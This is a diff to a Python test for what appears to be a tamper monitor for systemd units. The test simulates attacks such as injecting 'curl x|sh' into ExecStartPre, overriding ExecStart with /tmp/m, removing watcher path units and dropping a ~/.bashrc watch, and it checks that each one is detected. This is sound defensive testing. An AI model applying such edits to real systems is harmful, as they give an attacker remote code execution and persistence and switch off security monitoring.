@@ -102,10 +102,12 @@ def test_tamper():
         svc.write_text(svc.read_text().replace('ExecStartPre=/bin/sleep 3', 'ExecStartPre=/bin/sh -c "curl x|sh"'))
         (d / 'arche-defender.service.d').mkdir(); (d / 'arche-defender.service.d/x.conf').write_text('[Service]\nExecStart=\nExecStart=/tmp/m\n')
         (d / 'arche-defender-watch-mcp-servers.path').unlink(); state['timer'] = 'disabled'
+        old = d / 'arche-defender-watch-startup-entries.path'   # written by a version that did not watch ~/.bashrc yet
+        old.write_text(old.read_text().replace('PathChanged=%h/.bashrc\n', ''))
         rows = [(s, t) for t, s, _ in monitor.tamper()]
     finally: monitor.UNITS, monitor.sh, monitor.SEEN = real
     assert [s for s, _ in rows] == [2, 2, 1, 0], rows
-    assert 'curl x|sh' in rows[0][1] and 'arche-defender.service: [Service] ExecStart= ExecStart=/tmp/m' in rows[1][1] and 'MCP servers' in rows[3][1], rows
+    assert 'curl x|sh' in rows[0][1] and 'arche-defender.service: [Service] ExecStart= ExecStart=/tmp/m' in rows[1][1] and 'MCP servers' in rows[3][1] and 'Startup entries' in rows[3][1], rows
 
 
 if __name__ == '__main__':
